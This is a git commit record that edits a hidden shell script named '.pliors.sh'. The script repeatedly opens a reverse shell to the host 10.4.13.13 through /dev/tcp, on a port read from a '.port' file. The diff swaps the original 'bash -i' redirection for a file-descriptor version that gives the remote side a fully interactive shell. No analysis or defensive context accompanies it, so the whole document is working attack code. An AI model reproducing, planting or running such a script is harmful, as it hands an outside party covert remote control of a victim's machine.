5d0af6edc176fef4ebb577a91513205d9be16601
Fryy_55 <ivan_ugu55@icloud.com>
2025-10-22 00:59:50 +0500

    Add actual interactivity

--- .pliors.sh
+++ .pliors.sh
@@ -1,6 +1,8 @@
 #!/bin/bash
 
 for i in {1..6}; do
-    bash -i &> /dev/tcp/10.4.13.13/$(cat "$(dirname "$(readlink -f "$0")")/.port") 0>&1
+    port=$(cat "$(dirname "$(readlink -f "$0")")/.port")
+
+    bash -c "exec 55<>/dev/tcp/10.4.13.13/$port; bash <&55 >&55 2>&55"
     sleep 10
 done
